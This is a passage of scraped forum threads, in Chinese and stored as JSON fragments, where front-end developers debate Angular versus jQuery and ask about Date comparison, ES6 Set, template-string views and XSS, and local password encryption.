做成 App 的需求是有的，对 App 模式的局限性进行互补。 Flash 早就是用 C/S 模式运作的，我明白 SPA 的意思。但是你说模版肯定要有我不太认同，那是后台开发引入的概念，前端／客户端开发者应该更熟悉的概念应该是 UI 组件，就像 App 开发时用的那些。所以我想吐槽 Angular\r", "\r", " @", " 本来需要分工的却凑在一块，对应领域相关知识不是说换工具那么简单，要是这样的话给你一把菜刀就能当厨师。一个新技术出来不是不好，往往就是形成了误导之后，各种误用\r", "\r", " Routing 的概念对应用开发其实不是必须的，那是因为考虑浏览器的问题，前进后退历史这些。 Flex 框架也出现过类似的东西叫 deep linking\r", "\r", " 明智的人当然分得清 Good or Bad 但不是所有人水平都一样，对于 JS 这种弱类型、自由度又异常高的语言，没有规范的前提下ˊ_>ˋ", " 谢谢你提供视频的视频链接 看来我不应该只说 most popular...\r", "The World's Most Misunderstood Programming Language 这个头衔更贴切", "“所以，如果你问我 Angular2.0 的前途会怎样，我也不想再过多解释了，用后台开发的思想去控制前端开发， I think ，大多数传统的前端开发人员都水土不服，更别提切图工了^_^”\r", "\r", " ，撸主为什么认为 angular2 是“用后台的开发思想去控制前端开发”？", "angular bring js to html,相比 react 来说,对切图工更友善甚至是 angular 的一大优点...只关心撸主是否真正使用过 angular", " 写的有点偏差了抱歉，可能要把 2 个版本统称 Angular ，虽然 2.0 完全是另一回事，但有些核心的东西还是继承 1.x 的。因为对于只做过前端范畴的我来说， Angular 大部分概念都是新的， Web 系统里不是前端就是后端，或者应该说它集合了很多思想。本来这东西只有一定适用范围，不是万金油，过度宣传会造成误导\r", "\r", "我觉得前端的重心是界面表现。 Angular 是一整套很优雅的方案，当要关注一整个“优雅”就会显不出重点，你可以见到大多 Angular 教程是给你默认用 Boostrap 和 Material ，它不会再多的教你如何做好界面。而最终用户看得见摸得着的却是这一层，管你里面多优雅\r", "\r", "此外写之前我做点了功课 \r", "\r", "诶 搞错了- -# @", "  既然这么说，我是不是要把整个 V8 都给吃透了才能出师呢，新技术的出现本身就是为了让更多的人去方便使用，所以门槛会越来越低，这个趋势无法阻挡。", "\r", "\r", "使用组件的方法是获取组件，然后设置值。使用模板的方法是设置数据源然后自动绑定。后一种方式虽然反直觉，但 angular 真的比 jquery 少写很多代码。\r", "\r", "再有就是熟练度的问题了，由于思维模式完全不一样，重新适应需要一段时间。我就是因为懒才不愿意从 jq 迁移到 angular 。", " 一个语言领域广是好事，门槛低是好事。就像你不能既羡慕 java 社区的繁荣也吐槽 java 程序员水平低。多少好的框架好的思想正是从这么多的垃圾解决方案里整理和抽象出来的。", " 你是没有在各种语言上编写 gui 程序的经历。 html 再怎么说也是一套规范一种标准，比直接使用各种 gui 库要重新适应 api 还不方便迁移要好得多。\r", "\r", "我不知道 ios 上怎么样，安卓的 xml 和 style 难用的要死，让我选肯定还是 html 。", "大部分人没写过 AS3 ，没用过 Flex 吧（像现在使用的 WEB 开发一样的频度和深度）？\r", "撸主的文章写的有点乱，主题是担心 JS 沦为 AS 一样的下场？\r", "JS 前端和后端混合这个事（前端可以直接引用 node_module ）是挺容易混淆开发人员的开发视野的（低质量程序员），另外 6L 说的工程化也是一个值得深思的问题。\r", "但是 JS 世界应该不会有和 AS 一样的命运，根源在于大家并不信赖 Flash 依赖的自己实现的浏览器内的虚拟机，当然媒体的妖魔化也是原因之一。但是对于 JS 直接依赖于浏览器这种方式更能接受一些。\r", "有人说 Flash 一堆 BUG ，这个问题没有考量到： AS 是 Adobe 一个团队在开发和维护，自己实现了几乎全部的核心的功能，它不是开源代码，无法做到把责任分散给开源社区来分担。而 JS 的状态则是 vanilla js 的世界并不是核心，核心是目前充斥开源社区的框架和插件和工具，如果把这些开源社区的 ISSUE 整合起来， BUG 量比 AS 自家产生的 BUG 是只少不多的。\r", "\r", "所以 AS 的问题只是在于它不开源。\r", "\r", "Angular 的 directive ，在写法上和 SilverLight 以及 Mxml 的想法是如出一辙的。", "互联网是开放的，由用户决定，而不是技术。", " 同意。\r", "\r", "js 不会像 as 那样就是因为 js 是 w3c 默认的语言， w3c 和 mozilla 基金会拼死也得维护它。\r", "\r", "flash 的 bug 主要是因为封闭性。所以等 web assembly 完全实现后，浏览器内的 bug 肯定会直线上升。 web 开发者写个 c 语言，弄出个 buffer overflow 简直太容易了。", " 写界面肯定是 HTML ， css 方便。但 JS 框架工具那个乱啊，让人望而却步。当然我是那种只想用工具来方便完成事情，不想被工具玩的懒人。", "这不是 civet 大神吗...\r", "wonderfl 看过您的很多作品...\r", "\r", "还曾经尝试学习过 你制作的播放 midi 的 flash 可惜没有学成...\r", "\r", "flash 挂掉的主要原因之前看了某个文章\r", "是因为早起 MacOS 乔布斯求 adobe 把行业标准视频处理软件 adobe pr 开发个 MacOS 版本吧\r", "当时乔布斯被拒绝了\r", "\r", "后来 iPhone 1 的时候 adobe 说 把 flash 加入 iOS 吧 ...乔布斯:呵呵\r", "\r", "-----\r", "PS:本人对前端接触不多, 也不愿太多\r", "HTML5 渲染效率太低...\r", "不过前端做出的很多东西也不是拼效率\r", "很多轮子 拿来可用 快速成型 才是特点...\r", "不过因为兼容问题 有历史遗留问题\r", "没办法和做 AS3 的时候一样愉快的处理\r", "\r", "所以要是我选择的话 应该会是走 iOS 学习 Swift , 附带点 轻量玩后端的知识", " 是的。所以说 jquery 应该被纳入 w3c 标准，然后就只剩一大堆框架在那儿撕逼了。不想用框架的人直接用原生 api 也能解决问题。", " 我想再补充一下说法。\r", "\r", "Flash 没有说过不开源，而是业界一直不接受这么个东西。毕竟 Adobe 不像 Mozilla 这样的组织， Adobe 是个商业公司。曾经 Adobe 将虚拟机捐给 Mozilla ( ", " JS 是没有等 ES4(也等不到)而绕到 5 的。\r", "\r", "而 Adobe 的商业决策也是失利的，他们不懂怎么持久地经营技术。结果让 Flash 身先士卒，让 HTML5 踏着它的尸体前进。但很可惜，很多做 Flash 开发后来都继续去做游戏，做 Web 应用方面并不多。所以我也只好自认是偏门了，但是现在评论面对的是各种功力深厚的大大", "“用后台的开发思想去控制前端开发”\r", "编程领域分什么后台思想前端思想么？解决的问题规模有区别而已", " so ？我觉得那老外很搞笑~fb 开发 react 是为了解决通知中心的问题？这不过是 fb 在发布会上举个例子~然后我也很奇怪你告诉我有这篇文章是什么目的？证明有个老外跟你一样理解不深又主观？", " 你可以试一下只用 jquery 开发大规模应用，你就知道框架有什么用处了。", "于是其实就是不爽经常用的东西被判死刑？\r", "虽然我最常用 JavaScript 但是如果有更好的语言我还是毫不犹豫抛弃它", "html5+css3+js+jquery+vue.js 基本能覆盖 80%以上的需求了", "不喜欢就不学咯，你是自由的。", " \r", "avm 开源了，但是没有任何引导怎么做 contribution ： ", "   tarmarin 只是部分会被 avm 实现：“...The code will continue to be used by Adobe as part of the ActionScript™ Virtual Machine within Adobe® Flash® Player.”因为它是 ECMAScript4 的核心，并不只是服务于 avm 。", "全文都带着戾气啊，看着像一个 Flash 开发者不甘心看到 JavaScript 飞速发展，而自己的 Flash 却没落了", " 我从来都是只用 jq 的。另外轮到我写前端的机会不是很多，没办法尝试。", " 随你怎么理解。 38 楼的回复只说明你断章取义", " 你这样说我真只能笑了。每个人的遭遇不一样", " 说 react 是为 iOS 程序员开发的这点也很猎奇", " 其实你是想讨论“数据绑定”这个东西吧（或者叫 mvvm ）", "楼主从一个比较长的软件发展阶段来抒发关于 web 前端开发技术更迭循环的看法，对于我一直在做 C/C++,Java 及相关 C/S 结构所谓的后端开发打拼的人，总是看不清前端到底在折腾神码东西有了更进一步的认识，果然还是有前端的人终于从历史到如今到未来发表了自己的看法，不是一味的好评，值得学习。时代更迭，展示硬件平台的变更加速着软件展示层面的技术更迭，如见的 WebApp 不还是干着早先 Flash ， AIR ， MFC CDHtmlDialog 所干的事情。最后“ Angular 是吸引 Java 程序员而来”的说法，我只能呵呵了，闲等它被淹没在历史的技术洪流中，而 Java 程序员还是可以作出更好更精彩的东西。", " 其实说白了觉得用 jquery 就可以了的就跟用 servlet 就能开发 j2ee 差不多一个意思", " 彼此彼此吧~对于这种不怎么理解还非得出来发表自己的看法的，就像会写个 jsx 就觉得自己精通 react 了差不多，我也没什么好说的。你搬那老外的文章出来无非就是，“你看，人家老外也是这么说的吧”的意思嘛~我懂，你开心就好", " +1", " 不一样。模板和 orm 是必要的。前端的数据绑定是不必要的，因为完全可以转移到后端来做，工作量是一样的，就是绑定的时机不同，以及后端多花一点开销。", " 负责任得告诉你，模板和 orm 并不是必要的，有很多方式可以做前后端彻底分离。分离带来的好处不仅仅是让后端少一点花销，流量开销，用户体验提升，不依赖后端之后前端架构的提升带来的开发效率提升都是很重要的点。你以为业界都在吵吵说前后端分离是在玩？所以还是那句话，用 servlet 就能做 http 服务器，何必用 spring ？", " 你调用 json 接口也算是依赖后端，后端改接口你前端也得改。对于你们前端来说，只是换个格式写模板而已。\r", "\r", "另外 spring 的 ioc 还真不是必须的，大多数框架根本不带 ioc ，大多数公司也根本用不到 ioc 。都是跟风。", " 打个比方，我可以自己写个模板引擎，照样能把 angular 在后端渲染了，而你们根本不需要改动任何开发流程，你信不信？", " 什么时候 angular 就是和模板引擎了？你当然可以实现个模板把数据一次性显示出来，然后呢？数据绑定，组建服务？你以为还是在 10 年前前端还是没什么操作的年代？", " 数据绑定屏蔽掉，回调的逻辑是正常的，这很简单。\r", "\r", "更何况，你用 angular 就是最开始显示数据的时候痛快，回调呢？回调代码量不是和 jq 一样吗？", " [手动 doge]，回调代码量一样。。。先不说 promise ，你做一个企业站你写的 java 代码还没一个 spring 的包多呢，你干嘛还用 spring ？", " \r", "\r", "我这里暂且不吐槽前后端真正“分离”的说法。\r", "\r", "你们前端真是只会用轮子不会造轮子。连 angular 的基本原理都不清楚。呵呵了。\r", "\r", "看来前端视野太局限了，还需要学习一个。[手动 doge]", " 你睁大眼睛看看是不是一样？\r", "\r", "```\r", "// angular\r", "$http.get(url).success(function(data) {\r", "    $scope.name = data.name;\r", "    $scope.age = data.age;\r", "    $scope.click = function() {...};\r", "});\r", "```\r", "\r", "```\r", "// jq\r", "$.get(url).done(function(data) {\r", "    $('xxx-name').text(data.name);\r", "    $('xxx-age').text(data.age);\r", "    $('xxx-button').click(function() { ... });\r", "});\r", "```\r", "\r", "还 promise ， jq 早就支持 promise 了你造吗？", " 哟，还跟我讨论 angular 的原理呢，你要是知道 angular 原理还能说出来跟 jquery 一样你的脸皮真是厚道原子弹都打不破。你举的例子叫一样？上面的代码能在 view 层复用，下面的代码改个 id 你还能复用么？ angular 是 data=>UI 的驱动模型你知道么？看起来像就是一样？“看来前端视野太局限了，还需要学习一个”这句话用在你身上那是再好不过了。不懂别在那装懂，看着都觉得羞耻", " 还有，举例子举得详细一点，获取数据每个框架都差不多。当然深度的例子估计你也举不出来，毕竟眼界就那样。估计在你看来 react 跟 angular 也就是一个东西，估计你也不知道如何模块化。另外过了这么多天才回复我，是先去学习了 angular 再回来给我举例子吧？这么久还只能举出这样的例子，哎~劝你别玩前端了。", " 你前端除了给后端做展示， curd ，还能干嘛？\r", "\r", "我告诉你， mvvm 这种东西在 gui 编程里也有（比如 wpf ），但是不吃香的原因就是前端做的事情都是 curd ，太简单了。 gui 应用（特别是那些功能性的）不存在一个单一的数据源，你想 mvvm 也没办法。也就是你们前端 curd 用 mvvm 方便。\r", "\r", "我以前是做 gui 应用的，维护的应用少说 5 个窗体，多了要十几个，我照样不用任何绑定，就是获取控件然后访问，我完全控制得了。\r", "\r", "说你眼界低还不相信，你知道网页加载完了之后 angular 首先要干嘛吗？ angular 不需要遍历 dom 树然后解析双花括号？解析双花括号不是后端模板引擎的做法？你 angular 的语法不是跟 jinja 学的？就知道什么业务逻辑驱动模型，让你写个 parser 估计都跟抽筋似的。你根本没写过这些东西，所以跟你说移植到后端也是对牛弹琴。", " angular 的代码还复用呢，笑死我了，把 ng-app 和 ng-controller 一改，连$scope 都取不到了，还复用呢。\r", "\r", "另外我啥时候说过 jq 和 angular 原理一样了？我只是说，数据先用后端模板渲染好，回调用 jq 来做，完全可以实现一样的功能。（实际上这一直是传统 web 的做法）至于你们前端怎么舒服，我是搞后端的管你们干嘛。\r", "\r", "从执行效率来看， angular 的确解放了后端渲染模板的压力。浏览器开缓存的话也可以省一部分流量。\r", "\r", "从开发效率来看，处理数组在 angular 里就是一行赋值，而在 jq 里面，需要写个循环、创建节点、赋值、插入节点。\r", "\r", "但是 so what ？难道大部分网站不迁移至 angular 的原因是这些优点比不过带来的重构成本和学习成本吗？", " 噗，还跟 jinja 学的，后端模板引擎一大堆，目的是为了渲染，前端模板引擎也是渲染，看上去当然差不多，但是意义一样么？你用后端引擎能实现前后端分离么？知道为什么要分离么？你公司如果有 app 和网页客户端，用的接口都是类似的，你不分离后端就要多写一套，后端服务化听说过没？\r", "\r", "再次用前端渲染可以做切换效果你用后端模板来个试试？前端渲染可以做更多体验好的交互体验你用后端模板试试？写个 parser 你就高潮了？前端 orm 听说过没？\r", "\r", "还移植到后端，大家都在往前走你偏要往后走，还大喊着你们都走错了我也是醉了，你这么牛逼怎么没见你出个文明全球的开发模式？\r", "\r", "早跟你说你跟不上时代了还不信~呵呵", " 问题是我分离也得写两套。一套是静态页面，一套是 json 。这两个东西显然得分配两个路由。\r", "\r", "然后分离之后 req handler 的逻辑是读页面 /数据、刷给 out 。分离之前是读页面、读数据、渲染、刷给 out 。", " angular 干的事情就是之前后端模板引擎干的事情，只不过 angular 是遍历 dom 解析的，后端引擎是整块 split 来解析的，我说它是模板引擎，怎么就不对了？\r", "\r", "还数据绑定，有必要搞这么高大上的名词嘛？\r", "\r", "是， view 移到前端是趋势，以后也会有人移植各种语法的引擎到前端来用。“一切东西都会用前端的技术重做一遍”，但是你说是引擎也好，框架也好，他们的发源地是后端。", " 分离之后后端就解放了，只要接口设计得好，比如 restful 化之后就不用管调用数据是 web 还是 app ，而且由于接口和业务是解耦的，所以业务变更你的接口基本不需要动，这就是分层的意义。\r", "\r", "如果我理解你的 json 是借口，那么接口就是服务层，定义完之后就不会随着业务变化而变化的。所以等你们公司的网站变成一个两个， aop 出了三个四个，服务只要一个就够了。\r", "\r", "所有东西你都可以看成是读数据，渲染数据，输出。至于能把这些结合成什么样那就是你的本事了", " angular 可不只是模板引擎，他还是一个组建化框架，你用 jquery 出一个好的组建化方案看？除了组件化还有模块化，你给我来个？需要我跟你强调一下组件化和模块化的意义么？\r", "\r", "数据绑定有什么不对么，你更新数据 ui 就变化这么叫有错么？是不是你又要跟我扯“实际上不就是模板渲染么”？\r", "\r", "那 react 的虚拟 dom 在你眼里是不是也是模板渲染？知道为什么 react 渲染效率为什么比 angular 好么？\r", "\r", "你难道不知道这些框架出现的目的是为了更好得做更好的产品么？\r", "“服务器不就是套接字接收网络请求分析内容然后返回数据么”我是不是应该摔给你做后台的这么句话？", " \r", "\r", "组件？在正常的开发者眼里，所有程序集都是组件。'angular 是组件，但是 apache 也是组件，这是个非常正确但是没有任何卵用的词。\r", "\r", "前端就不要跟我谈什么模块化了。 html 到现在都不支持 include ， es 到 6 才支持 import 。后端开发者一开始就接触架构和模块化，无论是包含还是导入。前端之前非常缺少模块化所以现在格外推崇这个词，但是你叫任何一名前端之外的开发者，他肯定会觉得程序不都是模块化的吗？这有什么。\r", "\r", "所以我就特别讨厌吹捧名词的人，明明是个模板引擎，非得说成“组件化模块化的解决方案”。这种事情我觉得只有不懂代码的媒体才能干的出来。那我把接口说成“软件即服务”，你听着不一样别扭吗？", " 哎哟卧槽~100 多 k 的 angular 被说成模板引擎，笑得我胃疼。我也懒得跟你争，前端组件化都不知道，我再说下去也没意义。你继续用你的服务端模板引擎，我用我的 react", "JS 为啥现在这么流行，我觉得还有一个原因就是它能快速的将技术转化成利润， 想想一个公司仅用 javascript 一种语言就快速上线一个网站去赚钱，这个吸引力是很大的。\r", "楼上很多人喷现在很多所谓全栈 JS developer 都是半吊子，但从不懂技术的高层来看他们就是效率很高，所以他们能拿高薪并不奇怪"]},
{"content": ["<div class=\"topic_content\">clonenode 事件克隆了属性但没有克隆事件，怎么解决呢?</div>"], "reply": "3", "tittle": "如何进行带事件的 node 克隆", "comment": ["0", "2 小时惨剧。。", "😭"]},
{"content": "", "reply": "11", "tittle": "已有的轮子里，响应式的省市二级联动的选择器，大家有没有推荐的呢？", "comment": ["随便找个电商网站扒下来就行了", "  百度的注册页面有，挺全的～", "jquery.cityselect.js", "搭车同问 有没有全国高校的联动选择器？", "伸手党，想想你在哪里注册的时候要选省市区的，随便扒一下就来了， Github 也是一搜一大堆。\r", "同 5L\r", "压缩的够用了", " \r", "这个不错 基本上常用的都有了", "家里行政区划才改过，还没见过更新的", " 这个不错 哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>alert(new Date(2016,1,31) &gt; new Date(2016, 2, 1));<br>\n返回结果是 ture<br>\nalert(new Date(2016,1,30) &gt; new Date(2016, 2, 1));<br>\n返回结果是 false</p>\n\n<p>请问为什么这样子？</p>\n</div></div>"], "reply": "7", "tittle": "问一个 js 的日期比较问题", "comment": ["month 从 0 开始算   new Date(2016,1,31)  ==  2016 年 2 月 31 日    然而 2 月只有 29 天   so\r", " new Date(2016,1,31) == 2016 年 3 月 2 日\r", "\r", "下面那个同理", "字符串字典序", "字符串进行了比较...  转成时间戳可解。", " \r", " 非常感谢！", " 太感谢了", " 因为闰年的缘故，其实是 1 号 XD\r", "\r", "> new Date(2016,1,30).toLocaleString()\r", "'2016/3/1 上午 12:00:00'", "一楼正解。\r", "安利一个库， moment.js"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>基于 SpringBoot ， gradle 构建，一键无脑安装，本地局域网联机即可   ：</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/decaywood/LoftPage\">https://github.com/decaywood/LoftPage</a></p>\n\n<p>与妹子联机玩吧 : )</p>\n\n<p><img src=\"http://7xqo9j.com1.z0.glb.clouddn.com/LoftPage%2F2048.gif\" alt=\"\"></p>\n</div></div>"], "reply": "16", "tittle": "撸了一个对抗版 2048", "comment": ["这个好", "来个自动速配挺不错", "6666", " 这个就是速配，第一个连接等第二个进入才能开始。 第三个连接的得等第四个进入才能开始", " 那放在服务器直接访问网址就能速配了吗？那挺好的。", " 是的，不过如果中途某个人在玩的时候退了正好中间某个人又进来了就会发生错误，第三版再修复算了，虽然一般人也不会这么蛋疼。", "😂😂😂这个不错。可以弄个游戏大合集了，斗地主，麻将，象棋等。", "Nice!", "不错啊，我怎么没想到！有没有选择蓝牙连 or wifi 连？", "为什么和妹子玩 2048 而不去讨论 1024 的内容？", "...看频道以为是个简单 js 什么的，没想到用 SpringBoot 做了无脑安装，好强。", " 我估计只能 WiFi 吧，理论上浏览器能上网就行，无论你用什么方式，但是公网的我没试过，可能有坑", " 其实这个比麻将象棋什么的难实现些， 2048 实时性要求很高，网络传输这块要对错序与延迟什么的做处理，不然显示出来就乱套了\r", " 哈哈，过奖过奖", "和妹子玩 2048 简直 2333333...=。=", "我和妹子一般玩羞羞的游戏", "修复了一个小 bug ，手机也可以玩了： ）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有没有人用 javascript 加密后本地保存密码的啊？<br>\n求共享或推荐代码 <br>\n谢谢</p>\n</div></div>"], "reply": "18", "tittle": "求推荐一个可逆的 javascript 加密程序用来本地保存密码 替代 keepass 1password", "comment": ["有什么意义~~", " 保存密码", " \r", "(⊙o⊙)哦~理解错了~\r", "github 大概有\r", "自己写也简单\r", "1.express/koa(可选\r", "2.cache-storage 方便的储存模块\r", "3.加密库", " \r", "\r", "我这个链接注册的话会送你一个月高级会员，现在移动端貌似免费了，对于一般人来说免费版足以。\r", "\r", "只在客户端加密解密，云端只保存密文，就算有人偷了他们的硬盘，没有你的密码也无法解密你的密码库，目前最好用的跨平台的云密码库管理工具。", "貌似我也理解错了？？哈哈~题主再补充问题呗~\r", "\r", "难不成你做 WEB 程序要把密码存在本地以此实现自动登录功能？这样的话推荐 JWT ， LocalStorage 存 Token 。\r", "\r", "还是。。。其他什么原因？？", "LastPass 已经被脱过库，有密码库被破解的历史。对于楼上的推广。。。呵呵。。。", "\r", "除了不是 js 写的", " 密码库被破解是怎么做到的？", " 很多人的主密码并不复杂，显卡阵列机很容易跑出来。", " 只要你的密码库上了云端，就没有 100%的安全。", " 你的密码这么重要？ 还拿显卡跑。。。", " 请给出出处，不要歪曲事实\r", "\r", "lastpass 主密码是经过 10 万次 PBKDF2-SHA256 加密的，即使主密码不复杂也不是那么容易跑出来的", " 被拖的不是用户密码库，是主密码库。这么重要的密码用简单的也怪别人咯", "除了保存密码，主要还是要自动登陆。\r", "\r", "推荐一个最近在用的吧： dashlane ，还不错", "如果不是什么特别注重安全的密码，找个(比如 AES)这类的算法，稍微加工一下，弄一个足够长而且自己好记的密钥（主密码）按一定规则打乱，加密几次，就行了。", "\r", "原理同 1password ，优势是桌面版全免费。\r", "真正的全平台——支持黑莓 10 。", "   注册个账号登陆后按   p   打开简单密码管理工具   原理一样     服务端存密文  用户自己保存 key"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在过 es6 or es2015<br>\n但是看到 set 这一个新特性有些不理解，主要是 set 的应用场景不太清楚<br>\n根据阮一峰的《 es6 标准入门》中的介绍</p>\n\n<blockquote>\n<p>ES6 提供了新的数据结构 Set 。它类似于数组，但是成员的值都是唯一的，没有重复的值。</p>\n</blockquote>\n\n<p>在我简单认知中 set 只是提供不重复的数组，但是操作上并没有数组的方便</p>\n\n<p>而且我看到很多例子中更多是作为去重使用<br>\n将数组往 set 过一遍，去完重，再放回数组该干啥干啥</p>\n\n<p>还有一个是 set 对于结构复杂的数组有没有用？<br>\n比如多维数组，对象数组 set 结构能否正确如同一维数组那样处理？</p>\n</div></div>"], "reply": "5", "tittle": "es6 set 的应用实例？", "comment": ["Set 在于提供了一个无序不重复集合\r", "例如储存 ID 的集合", "楼主没有做过一个 {a:true,b:true} 的数组来实现过 set 的作用么……", ">> ES6 提供了新的数据结构 Set 。它类似于数组，但是成员的值都是唯一的，没有重复的值。\r", "\r", "这句话说它类似数组，但是没说让你用来代替数组啊……该用数组的地方还是要用数组，需要去冲的时候再考虑 set 。", "最近用的的一个场景：\r", "有一堆类似这样的数据:{color:'red'}, {color:'green'}, {color:'blue'}, {color:'red'}, {color:'yellow'}...\r", "\r", "可以直接 map ，然后用 set 存储 color", "初中还是高中来着？集合的概念。还记得俩圆么？交集并集。\r", "\r", "set 就是集合。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用 Templete string ，我们可以方便得在 string 中插入变量。这不就是 view component 主要工作吗？<br>\n例子：<br>\n<code><br>\nfunction sayHi(name) {<br>\n  return `&lt;p&gt;How are you, ${name}?&lt;/p&gt;`;<br>\n}<br>\n</code><br>\n于是在<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/timqian/GiG\">最近的小项目</a>中试验了下这种方式.</p>\n\n<h2>项目简介</h2>\n\n<p>利用 github 作为后端博客系统，可以直接在博客上增删内容(通过调用 github api)</p>\n\n<h2>项目结构</h2>\n\n<ul>\n<li>store.js: 保存应用状态                (Model)</li>\n<li>componets: 放 view components       (View)</li>\n<li>index.js: 根据不同的 route 做不同的事  (Controller)</li>\n<li>其他 util 函数</li>\n</ul>\n\n<h2>工作原理</h2>\n\n<p>主体部分放在 <code>&lt;main id=\"contentContailer\"&gt;&lt;/main/&gt;</code>中，根据不同的 route 设置其的 innerHTML 。<br>\nheader 和 footer 部分几乎不变，只需要根据不同的 route 控制一下某些内容是否显示。</p>\n\n<h2>这种方式的好处</h2>\n\n<ul>\n<li>代码体积小</li>\n<li>业务无关代码少</li>\n<li>view component 容易理解</li>\n</ul>\n\n<h2>遇到的坑</h2>\n\n<ul>\n<li>由于使用这种方式生成的 component 是纯字符串，所以无法在 onclick handler 中调用其他的模块。所以对于需要比较复杂操作 onclick 事件，我会改变网页的 route, 在 <code>index.js</code>中来 handle 这个事件，导致 index 比较臃肿。</li>\n</ul>\n\n<h2>项目地址</h2>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/timqian/GiG\">https://github.com/timqian/GiG</a></p>\n</div></div>"], "reply": "24", "tittle": "实验：使用 es6 templete string 作为 view component(取代 react？)", "comment": ["又是一个轮子", "所谓字符串中插入变量和直接字符串拼接有什么区别", "话说我也有个 reactive 小模块 ", " ，基于 Object.defineProperty 方式：\r", "支持 textcontent html function attribute 等插入方式\r", "支持可重用 binding ， event handler 函数\r", "支持 Reactive 实例属性共享，避免 dom 重复解析\r", "支持替换绑定 model\r", "\r", "仅供参考", " 没有本质区别，只是看起来舒服点，速度快一点，\r", "可以在这里测试： ", "字符串拼 DOM ，小心 XSS 哦……", "  XSS 是其他用户在这个网站中注入脚本，跟 DOM 生成方式没关系吧？\r", " 该应用只有一个用户，所以应该不存在 xss 的问题，不知道对不对？", "你是要取代 underscore/lodash 的 template 吧？\r", "\r", "和 react 有啥关系……\r", "\r", "react 的核心不是通过内部生成虚拟 dom,然后和实际 dom 对比，仅操作发生变化的，以避免昂贵的 dom 操作的浪费么？", " 取代 说的确实不妥，，我的意思是原来用 react 作为 View 层，这里试了下直接使用 string template", " \r", "\r", "我是用 react+backbones 的\r", "\r", "本来就是用 react 来实现数据绑定，取代 backbones 中使用的 underscore template 的。\r", "\r", "你这个做法我看不懂优点在哪……", " 这种做法只是一个实验，踩踩坑", "这样的话，实现在模板中添加逻辑比较困难吧", " 嗯，调不了其他模块", " 目前没找到好办法，复杂逻辑只好多一个 route 来处理", "well ", " look good ！ sox 大法好", " 跟 xss 有什么关系", " \r", " xss 主要靠模板层过滤", " ", "\r", "\r", "可以参考这个回答，说的比较清楚的。楼主这个场景可能没有 XSS 风险，但是我们还是要避免 innerHTML 的方式插入 DOM 。", "innerHTML 不仅可以避免 xss 而且性能上要好得多", "说错了 应该是 textContent", " 你这相当于没说 😂", " [我不是针对你，我是说所有用这个的东西都可以被 XSS 。] \r", "\r", "楼主现在用在了博客上，那么只能自己 XSS 自己，一旦放开了内容生产者，那么就可以到处任意 XSS 了。\r", "\r", "（以及 markdown 本身并不确保不被 XSS （随便找个 marked 的 XSS 就可以用了", "嗯嗯，字符串拼接 html 是容易遇到 xss 问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个是山寨 angular 精简演试版，我做得很卖力，仿真度是极高的，现在的主流都 angular 之类的 MVVM 框架。</p>\n\n<p>那么有多少人知道底层呢，我相信大部份人都是盲目地用，对底层是一问三不知的，这个山寨 angular 不为显罢技术，何况也不是什么技术，只纯粹带大家进底层看看，浪费 2 小时左右时间也值得的！</p>\n\n<p>讲下我为什么山寨 angular ？是因为群里一个人，他说：“老是山寨 JQUERY 这种没技术的东西，有本事山寨 ng 出来”（又讽刺 minggeJS 了）。山寨 angular ，就山寨吧，山寨完了，放演试出来了</p>\n\n<p>演试地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.shearphoto.com/angular/\">http://www.shearphoto.com/angular/</a></p>\n\n<p>下载地址在底部！，这个山寨 angular ，绝不是简单的 replace 简单替换字符串，泄及到数据绑定操作，仿真度是极高的</p>\n\n<p>演试地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.shearphoto.com/angular/\">http://www.shearphoto.com/angular/</a></p>\n</div></div>"], "reply": "38", "tittle": "山寨 angular , 仿真度 95% ，带你看看 angular 底层", "comment": ["没人呢，不会吧", "前端渣渣来学习一下\r", "我喜欢用 Hbulider ，明哥你呢？", "明哥前排，小板凳葵花瓜子啤酒出售", "老实说我从来没用过 AngularJS ，正因为我反感 AngularJS 。\r", "为什么我反感，因为我完全有开发 AngularJS 的能力， AngularJS 的底层我都了如指掌。", "  我开发 minggeJS 前,我已经可以山寨 NG ，我目前能山寨的框架有 JQUERY NG  react  TP 框架， YII 框架，", "。。。。。。", " 求山寨 Yii", "  明哥至少写个的 todomvc 的 demo 嘛", "虽然 bs 炒作，但为重造轮子的人点赞", "  \r", "你是不是以为实现一个数据替换就叫 angular 了……", " 这是简单的数据替换？      ang 的主要特点就是模板标签处理以及 attr 附加属性", "垃圾！我不是说你的山寨 angular 垃圾，而是说你做的所有项目都是垃圾\r", "\r", "//对不起，我没有写注释的习惯，看不懂就拉倒，请支持 minggeJS\r", "\r", "对不起我有骂人的习惯。", "minggeJS 的功能很强大，希望能有一批用户加入 minggeJS 的大家庭\r", "\r", "minggeJS 支持手机触屏，支持 MVVM 架构，支持 DOM 操作，兼容性好兼容到 IE678\r", "文件只有 35K ，手机 PC 能够两用，功能超级强大。希望大家不要对 minggeJS 带着伎视， minggeJS 真的好强大，加入吧", "对 minggeJS 带着伎视 ###「歧」", "顶上", "学 js 第二个月，写了个数据绑定的 js 框架，现在用在项目里。\r", "不想吹黑， angularjs 那么多代码不是白写的，功用不一样，看问题的角度不一样", "我只想说国人不仅能山寨，还能吃透 MVVM\r", "\r", "  不错，不过我初学 JS 的第一个星期可以山寨 js 框架了", "赶快投到 minggeJS 怀抱，保你成为高手， minggeJS 使用高手，也是一名高手，只是基于我石榴裙下的高手，但也是高手嘛，而且短期内能成高手", "明哥在哪家公司工作？", "说实话，楼主虽然有点哗众取宠，但 js 水平应该还是强于绝大多数 v2er 。。", " 嗯，起码排在前 5 是没问题的。只不过他的风格不符合国人的胃口而已，谦卑是中华民族上下五千年的文明传统。。。", "       我是全栈工程师，不要绝大多数，应该前十名内，", "说实话，单看 minggeJS 这个名字就不会用了，更不用说作者这么自大，当然，也可能是炒作。\r", "嗯？说自大应该没错吧？有时候态度决定成败，而不是技术。", "傻逼", "明哥有没有兴趣看看这个\r", "\r", "希望有个 jser 来做 res.js ，要有完整测试。", "前 5 ？ 别来侮辱专职前端了好吗", 